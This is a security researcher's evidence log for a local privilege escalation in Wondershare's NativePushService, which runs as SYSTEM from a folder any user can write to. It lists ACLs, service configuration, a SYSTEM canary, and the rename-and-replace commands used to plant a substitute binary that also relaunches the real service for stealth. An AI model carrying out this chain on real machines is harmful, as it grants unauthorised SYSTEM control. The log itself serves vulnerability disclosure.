# Evidence Log — Finding #42: Wondershare NativePushService CWE-732 LPE

## Test Environment

| Field | Value |
|-------|-------|
| **Machine** | LAPTOP-R32M8MLI |
| **OS** | Windows 11 Home Build 26200 |
| **Test Date** | 2026-06-15 |
| **User Context** | Standard user (gwu07, no admin) |
| **Compiler** | MSVC 19.51.36247 (VS 18 Community) |

---

## Evidence 1: Service Configuration

```
SERVICE_NAME: NativePushService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Wondershare Native Push Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Key facts:** LocalSystem account + AUTO_START + binary in user-profile directory.

---

## Evidence 2: Directory ACL (User-Writable)

```
C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush
    BUILTIN\Users:(OI)(CI)(F)                    ← ALL USERS FULL CONTROL (Object+Container Inherit)
    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    LAPTOP-R32M8MLI\apacw:(I)(OI)(CI)(F)
```

`BUILTIN\Users:(OI)(CI)(F)` = **every standard user on the machine has Full Control on the directory and all files within it**, inherited to all new files.

---

## Evidence 3: Binary ACL (User-Writable)

```
WsNativePushService.exe
    BUILTIN\Users:(I)(F)                         ← ALL USERS FULL CONTROL (Inherited)
    NT AUTHORITY\SYSTEM:(I)(F)
    BUILTIN\Administrators:(I)(F)
    LAPTOP-R32M8MLI\apacw:(I)(F)
```

The `(I)` flag confirms this is inherited from the parent directory ACL. The service binary itself is writable by any standard user.

---

## Evidence 4: Canary File — SYSTEM Execution Confirmed

```
C:\Windows\Temp\ws_diag.log contents:

20260615_031138 gwu07 21244
20260615_031401 gwu07 51576
20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE
```

### Canary Analysis

| Field | Value | Meaning |
|-------|-------|---------|
| Timestamp | 20260615_033636 | 2026-06-15 03:36:36 |
| Username | **SYSTEM** | NT AUTHORITY\SYSTEM — not the standard user |
| Elevation | **elev=1** | Token is elevated (full SYSTEM privileges) |
| PID | 34776 | New process started by Service Control Manager |
| Tag | BINARY_REPLACE | Our PoC payload (not the original service) |

**The first two lines** (gwu07, PIDs 21244/51576) are from earlier development testing when the binary was run manually outside SCM context. **The third line** is the confirmed SYSTEM execution after service restart.

---

## Evidence 5: Attack Chain (as executed)

1. **Standard user** compiled replacement binary: `cl.exe svc_replace.c /Fe:WsNativePushService.exe /O1 /GS- /link advapi32.lib user32.lib`
2. **Standard user** renamed running service exe: `ren WsNativePushService.exe WsNativePushService_real.exe` (Windows allows renaming running/memory-mapped executables)
3. **Standard user** planted replacement: `copy WsNativePushService.exe <service-dir>\WsNativePushService.exe`
4. **Admin** restarted service (simulates reboot/crash recovery): `net stop NativePushService && net start NativePushService`
5. **SCM** started our replacement as **LocalSystem**
6. Canary written: `SYSTEM|elev=1|pid=34776|BINARY_REPLACE`
7. Real service launched by our replacement for stealth/continuity

**Steps 1-3 require NO elevation.** Step 4 happens naturally on reboot (AUTO_START service).

---

## Evidence 6: PoC Source

File: `svc_replace.c` (attached)

Functionality:
- Registers with SCM as NativePushService (proper service lifecycle)
- Reports SERVICE_RUNNING status
- Writes canary (timestamp, username, elevation, PID, tag)
- Launches renamed real binary for service continuity
- No payload, no network, no persistence, no credential access

---

## Reproduction Checklist

- [x] Service runs as LocalSystem — confirmed via `sc qc`
- [x] Service is AUTO_START — confirmed via `sc qc`
- [x] Directory has BUILTIN\Users Full Control — confirmed via `icacls`
- [x] Binary has BUILTIN\Users Full Control — confirmed via `icacls`
- [x] Standard user can rename running binary — confirmed (Windows behavior)
- [x] Standard user can write replacement binary — confirmed
- [x] Replacement executes as SYSTEM on restart — **CONFIRMED** (canary: `SYSTEM|elev=1`)
- [x] Real service continues running for stealth — confirmed (replacement launches `_real.exe`)
